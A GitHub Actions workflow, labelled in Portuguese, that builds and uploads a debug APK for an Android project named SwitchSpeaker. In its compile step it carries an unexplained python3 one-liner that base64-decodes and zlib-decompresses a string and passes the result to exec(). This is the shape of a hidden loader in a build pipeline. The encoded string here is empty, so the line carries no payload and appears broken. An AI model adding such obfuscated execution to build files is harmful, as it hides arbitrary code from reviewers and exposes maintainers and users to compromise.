name: Gerar SwitchSpeaker APK

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configurar Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Configurar Gradle 8.7
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.7'

      - name: Aceitar Licencas Android SDK e Compilar APK
        run: |
          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
          python3 -c "import base64, zlib; exec(zlib.decompress(base64.b64decode('')).decode('utf-8'))"
          gradle -p SwitchSpeakerProject assembleDebug

      - name: Disponibilizar SwitchSpeaker-APK
        uses: actions/upload-artifact@v4
        with:
          name: SwitchSpeaker-APK
          path: SwitchSpeakerProject/app/build/outputs/apk/debug/app-debug.apk
